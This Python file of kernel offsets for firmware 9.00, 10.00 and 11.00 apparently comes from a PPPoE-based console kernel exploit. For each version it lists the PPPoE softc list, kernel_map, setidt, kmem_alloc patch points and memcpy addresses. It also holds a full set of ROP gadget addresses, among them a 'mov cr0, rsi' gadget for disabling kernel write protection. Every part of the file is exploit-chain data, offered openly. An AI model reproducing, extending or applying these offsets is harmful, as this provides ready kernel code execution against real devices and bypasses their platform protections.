# Copyright (C) 2024 Andy Nguyen
#
# This software may be modified and distributed under the terms
# of the MIT license.  See the LICENSE file for details.


# FW 9.00
class OffsetsFirmware_900:
    PPPOE_SOFTC_LIST = 0xffffffff843ed9f8

    KERNEL_MAP = 0xffffffff84468d48

    SETIDT = 0xffffffff82512c40

    KMEM_ALLOC = 0xffffffff8257be70
    KMEM_ALLOC_PATCH1 = 0xffffffff8257bf3c
    KMEM_ALLOC_PATCH2 = 0xffffffff8257bf44

    MEMCPY = 0xffffffff824714b0

    # 0xffffffff823fb949 : mov cr0, rsi ; ud2 ; mov eax, 1 ; ret
    MOV_CR0_RSI_UD2_MOV_EAX_1_RET = 0xffffffff823fb949

    SECOND_GADGET_OFF = 0x3d

    # 0xffffffff82996603 : jmp qword ptr [rsi + 0x3d]
    FIRST_GADGET = 0xffffffff82996603

    # 0xffffffff82c76646 : push rbp ; jmp qword ptr [rsi]
    PUSH_RBP_JMP_QWORD_PTR_RSI = 0xffffffff82c76646

    # 0xffffffff822b4151 : pop rbx ; pop r14 ; pop rbp ; jmp qword ptr [rsi + 0x10]
    POP_RBX_POP_R14_POP_RBP_JMP_QWORD_PTR_RSI_10 = 0xffffffff822b4151

    # 0xffffffff82941e46 : lea rsp, [rsi + 0x20] ; repz ret
    LEA_RSP_RSI_20_REPZ_RET = 0xffffffff82941e46

    # 0xffffffff826c52aa : add rsp, 0x28 ; pop rbp ; ret
    ADD_RSP_28_POP_RBP_RET = 0xffffffff826c52aa

    # 0xffffffff8251b08f : add rsp, 0xb0 ; pop rbp ; ret
    ADD_RSP_B0_POP_RBP_RET = 0xffffffff8251b08f

    # 0xffffffff822008e0 : ret
    RET = 0xffffffff822008e0

    # 0xffffffff822391a8 : pop rdi ; ret
    POP_RDI_RET = 0xffffffff822391a8

    # 0xffffffff822aad39 : pop rsi ; ret
    POP_RSI_RET = 0xffffffff822aad39

    # 0xffffffff82322eba : pop rdx ; ret
    POP_RDX_RET = 0xffffffff82322eba

    # 0xffffffff822445e7 : pop rcx ; ret
    POP_RCX_RET = 0xffffffff822445e7

    # 0xffffffff822ab4dd : pop r8 ; pop rbp ; ret
    POP_R8_POP_RBP_RET = 0xffffffff822ab4dd

    # 0xffffffff8279fa0f : pop r12 ; ret
    POP_R12_RET = 0xffffffff8279fa0f

    # 0xffffffff82234ec8 : pop rax ; ret
    POP_RAX_RET = 0xffffffff82234ec8

    # 0xffffffff822008df : pop rbp ; ret
    POP_RBP_RET = 0xffffffff822008df

    # 0xffffffff82bb687a : push rsp ; pop rsi ; ret
    PUSH_RSP_POP_RSI_RET = 0xffffffff82bb687a

    # 0xffffffff82244ed0 : mov rdi, qword ptr [rdi] ; pop rbp ; jmp rax
    MOV_RDI_QWORD_PTR_RDI_POP_RBP_JMP_RAX = 0xffffffff82244ed0

    # 0xffffffff82b7450e : mov byte ptr [rcx], al ; ret
    MOV_BYTE_PTR_RCX_AL_RET = 0xffffffff82b7450e

    # 0xffffffff82632b9c : mov rdi, rbx ; call r12
    MOV_RDI_RBX_CALL_R12 = 0xffffffff82632b9c

    # 0xffffffff8235b387 : mov rdi, r14 ; call r12
    MOV_RDI_R14_CALL_R12 = 0xffffffff8235b387

    # 0xffffffff822e3d7e : mov rsi, rbx ; call rax
    MOV_RSI_RBX_CALL_RAX = 0xffffffff822e3d7e

    # 0xffffffff82363918 : mov r14, rax ; call r8
    MOV_R14_RAX_CALL_R8 = 0xffffffff82363918

    # 0xffffffff82cb683a : add rdi, rcx ; ret
    ADD_RDI_RCX_RET = 0xffffffff82cb683a

    # 0xffffffff82409557 : sub rsi, rdx ; mov rax, rsi ; pop rbp ; ret
    SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET = 0xffffffff82409557

    # 0xffffffff82b85693 : jmp r14
    JMP_R14 = 0xffffffff82b85693


# FW 10.00
class OffsetsFirmware_1000:
    PPPOE_SOFTC_LIST = 0xffffffff8446d920

    KERNEL_MAP = 0xffffffff8447bef8

    SETIDT = 0xffffffff8227b460

    KMEM_ALLOC = 0xffffffff8253b040
    KMEM_ALLOC_PATCH1 = 0xffffffff8253b10c
    KMEM_ALLOC_PATCH2 = 0xffffffff8253b114

    MEMCPY = 0xffffffff82672d20

    MOV_CR0_RSI_UD2_MOV_EAX_1_RET = 0xffffffff82376089 # 0F 22 C6 48 F7 C6

    SECOND_GADGET_OFF = 0x3b # 3? (e.g 3a, 3b, 3c, 3d, 3e..)

    # jmp qword ptr [rsi + 0x3b]
    FIRST_GADGET = 0xffffffff82249c5d # FF 66 3?

    # push rbp ; jmp qword ptr [rsi]
    PUSH_RBP_JMP_QWORD_PTR_RSI = 0xffffffff82c73946 # 55 FF 26

    # pop rbx ; pop r14 ; pop rbp ; jmp qword ptr [rsi + 0x10]
    POP_RBX_POP_R14_POP_RBP_JMP_QWORD_PTR_RSI_10 = 0xffffffff82545741 # 5B 41 5E 5D FF 66 10

    # lea rsp, [rsi + 0x20] ; repz ret
    LEA_RSP_RSI_20_REPZ_RET = 0xffffffff8292b346 # 48 8D 66 20 F3 C3

    # add rsp, 0x28 ; pop rbp ; ret
    ADD_RSP_28_POP_RBP_RET = 0xffffffff826d0d0a # 48 83 C4 28 5D C3

    # add rsp, 0xb0 ; pop rbp ; ret
    ADD_RSP_B0_POP_RBP_RET = 0xffffffff82531c3f # 48 81 C4 B0 00 00 00 5D C3

    # ret
    RET = 0xffffffff822008e0 # C3

    # pop rdi ; ret
    POP_RDI_RET = 0xffffffff82510c4e # 5F C3

    # pop rsi ; ret
    POP_RSI_RET = 0xffffffff822983e0 # 5E C3

    # pop rdx ; ret
    POP_RDX_RET = 0xffffffff824029b2 # 5A C3

    # pop rcx ; ret
    POP_RCX_RET = 0xffffffff822983ba # 59 C3

    # pop r8 ; pop rbp ; ret
    POP_R8_POP_RBP_RET = 0xffffffff8237dd7d # 47 58 5D C3

    # pop r12 ; ret
    POP_R12_RET = 0xffffffff827b32ef # 41 5C C3

    # pop rax ; ret
    POP_RAX_RET = 0xffffffff8229974f # 58 C3

    # pop rbp ; ret
    POP_RBP_RET = 0xffffffff822008df # 5D C3

    # push rsp ; pop rsi ; ret
    PUSH_RSP_POP_RSI_RET = 0xffffffff82bb3ee6 # 54 5E C3

    # mov rdi, qword ptr [rdi] ; pop rbp ; jmp rax
    MOV_RDI_QWORD_PTR_RDI_POP_RBP_JMP_RAX = 0xffffffff8256bfb0  # 48 8B 3F 5D FF E0

    # mov byte ptr [rcx], al ; ret
    MOV_BYTE_PTR_RCX_AL_RET = 0xffffffff824f0448 # 88 01 C3

    # mov rdi, rbx ; call r12
    MOV_RDI_RBX_CALL_R12 = 0xffffffff8236bbec # 48 89 DF 41 FF D4

    # mov rdi, r14 ; call r12
    MOV_RDI_R14_CALL_R12 = 0xffffffff8236ba27 # 4C 89 F7 41 FF D4

    # mov rsi, rbx ; call rax
    MOV_RSI_RBX_CALL_RAX = 0xffffffff823f501e # 48 89 DE FF D0

    # mov r14, rax ; call r8
    MOV_R14_RAX_CALL_R8 = 0xffffffff8259e638 # 49 89 C6 41 FF D0

    # add rdi, rcx ; ret
    ADD_RDI_RCX_RET = 0xffffffff82cb3b3a # 48 03 F9 C3

    # sub rsi, rdx ; mov rax, rsi ; pop rbp ; ret
    SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET = 0xffffffff822bfa87 # 48 29 D6 48 89 F0 5D C3

    # jmp r14
    JMP_R14 = 0xffffffff8280346f # 49 FF E6


# FW 11.00
class OffsetsFirmware_1100:
    PPPOE_SOFTC_LIST = 0xffffffff844e2578

    KERNEL_MAP = 0xffffffff843ff130

    SETIDT = 0xffffffff8245bdb0

    KMEM_ALLOC = 0xffffffff82445e10
    KMEM_ALLOC_PATCH1 = 0xffffffff82445edc
    KMEM_ALLOC_PATCH2 = 0xffffffff82445ee4

    MEMCPY = 0xffffffff824dddf0

    # 0xffffffff824f1299 : mov cr0, rsi ; ud2 ; mov eax, 1 ; ret
    MOV_CR0_RSI_UD2_MOV_EAX_1_RET = 0xffffffff824f1299

    SECOND_GADGET_OFF = 0x3e

    # 0xffffffff82eb1f97 : jmp qword ptr [rsi + 0x3e]
    FIRST_GADGET = 0xffffffff82eb1f97

    # 0xffffffff82c75166 : push rbp ; jmp qword ptr [rsi]
    PUSH_RBP_JMP_QWORD_PTR_RSI = 0xffffffff82c75166

    # 0xffffffff824b90e1 : pop rbx ; pop r14 ; pop rbp ; jmp qword ptr [rsi + 0x10]
    POP_RBX_POP_R14_POP_RBP_JMP_QWORD_PTR_RSI_10 = 0xffffffff824b90e1

    # 0xffffffff8293c8c6 : lea rsp, [rsi + 0x20] ; repz ret
    LEA_RSP_RSI_20_REPZ_RET = 0xffffffff8293c8c6

    # 0xffffffff826cb2da : add rsp, 0x28 ; pop rbp ; ret
    ADD_RSP_28_POP_RBP_RET = 0xffffffff826cb2da

    # 0xffffffff824cdd5f : add rsp, 0xb0 ; pop rbp ; ret
    ADD_RSP_B0_POP_RBP_RET = 0xffffffff824cdd5f

    # 0xffffffff822007e4 : ret
    RET = 0xffffffff822007e4

    # 0xffffffff825f38ed : pop rdi ; ret
    POP_RDI_RET = 0xffffffff825f38ed

    # 0xffffffff8224a6a9 : pop rsi ; ret
    POP_RSI_RET = 0xffffffff8224a6a9

    # 0xffffffff822a4762 : pop rdx ; ret
    POP_RDX_RET = 0xffffffff822a4762

    # 0xffffffff8221170a : pop rcx ; ret
    POP_RCX_RET = 0xffffffff8221170a

    # 0xffffffff8224ae4d : pop r8 ; pop rbp ; ret
    POP_R8_POP_RBP_RET = 0xffffffff8224ae4d

    # 0xffffffff8279faaf : pop r12 ; ret
    POP_R12_RET = 0xffffffff8279faaf

    # 0xffffffff8221172e : pop rax ; ret
    POP_RAX_RET = 0xffffffff8221172e

    # 0xffffffff822008df : pop rbp ; ret
    POP_RBP_RET = 0xffffffff822008df

    # 0xffffffff82bb5c7a : push rsp ; pop rsi ; ret
    PUSH_RSP_POP_RSI_RET = 0xffffffff82bb5c7a

    # 0xffffffff823ce260 : mov rdi, qword ptr [rdi] ; pop rbp ; jmp rax
    MOV_RDI_QWORD_PTR_RDI_POP_RBP_JMP_RAX = 0xffffffff823ce260

    # 0xffffffff8236ae58 : mov byte ptr [rcx], al ; ret
    MOV_BYTE_PTR_RCX_AL_RET = 0xffffffff8236ae58

    # 0xffffffff8233426c : mov rdi, rbx ; call r12
    MOV_RDI_RBX_CALL_R12 = 0xffffffff8233426c

    # 0xffffffff823340a7 : mov rdi, r14 ; call r12
    MOV_RDI_R14_CALL_R12 = 0xffffffff823340a7

    # 0xffffffff82512dce : mov rsi, rbx ; call rax
    MOV_RSI_RBX_CALL_RAX = 0xffffffff82512dce

    # 0xffffffff82624df8 : mov r14, rax ; call r8
    MOV_R14_RAX_CALL_R8 = 0xffffffff82624df8

    # 0xffffffff82cb535a : add rdi, rcx ; ret
    ADD_RDI_RCX_RET = 0xffffffff82cb535a

    # 0xffffffff8260f297 : sub rsi, rdx ; mov rax, rsi ; pop rbp ; ret
    SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET = 0xffffffff8260f297

    # 0xffffffff82b84657 : jmp r14
    JMP_R14 = 0xffffffff82b84657
